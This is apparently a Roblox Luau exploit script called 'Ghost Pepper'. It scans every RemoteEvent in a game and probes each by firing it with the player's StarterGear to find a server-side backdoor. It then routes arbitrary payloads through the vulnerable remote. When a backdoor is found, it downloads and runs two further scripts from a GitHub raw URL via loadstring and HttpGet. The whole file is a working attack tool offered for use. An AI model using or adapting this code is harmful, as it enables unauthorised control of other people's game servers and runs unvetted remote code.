local timer = 0
local backdoorfound = false
local vulnremote = nil
local safetime = 0.25
local scannedremotes = 0

-- Branded hint
local hint = Instance.new("Hint", workspace)
hint.Text = "GHOST PEPPER: Searching for backdoors. Please be patient! (Check F9)"

-- Top bar
local topbar = Instance.new("ScreenGui", game.Players.LocalPlayer.PlayerGui)
topbar.Name = "GHOSTTopBar"
local barframe = Instance.new("Frame", topbar)
barframe.Size = UDim2.new(1, 0, 0, 30)
barframe.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
local bartext = Instance.new("TextLabel", barframe)
bartext.Size = UDim2.new(1, 0, 1, 0)
bartext.BackgroundTransparency = 1
bartext.TextColor3 = Color3.fromRGB(255, 50, 50)
bartext.Text = "GHOST PEPPER: Scanned 0 remotes"

-- Timer
coroutine.wrap(function()
    repeat
        timer += 0.01
        task.wait(0.01)
    until backdoorfound
end)()

-- Bindable event
local actionbind = Instance.new("BindableEvent", game.Players.LocalPlayer)
actionbind.Name = "GHOSTAction"
actionbind.Event:Connect(function(item)
    if backdoorfound then
        vulnremote:FireServer(item)
    end
end)

-- Test remote
local function testRemote(remote)
    local function fireTest(item)
        pcall(function()
            remote:FireServer(item)
        end)
    end
    local function isDestroyed(obj)
        return obj == nil or obj.Parent == nil
    end
    local testpart = game.Players.LocalPlayer.StarterGear
    fireTest(testpart)
    task.wait(safetime)
    scannedremotes += 1
    bartext.Text = "GHOST PEPPER: Scanned "..scannedremotes.." remotes"
    print("GHOST PEPPER: "..remote.Name.." /Backdoor: "..tostring(isDestroyed(testpart)))
    if isDestroyed(testpart) then
        vulnremote = remote
        return true
    end
    return false
end

-- Scan game
local function scan()
    if backdoorfound then return end
    for _, v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") and v.Parent and v.Parent.Name ~= "RobloxReplicatedStorage" then
            if testRemote(v) then
                backdoorfound = true
                print("GHOST PEPPER: Backdoor found!")
                return
            end
        end
    end
end

-- Main
task.wait(2)
scan()
topbar:Destroy()
if backdoorfound then
    hint.Text = "GHOST PEPPER: Backdoor found in "..tostring(timer).."s! (Remote: "..vulnremote.Name..")"
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/GhostFunction.lua"))()
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GhostStrots/Ghost-Pepper/refs/heads/main/UI.lua"))()
    task.wait(10)
    hint:Destroy()
else
    hint.Text = "GHOST PEPPER: No backdoor found."
    task.wait(10)
    hint:Destroy()
end
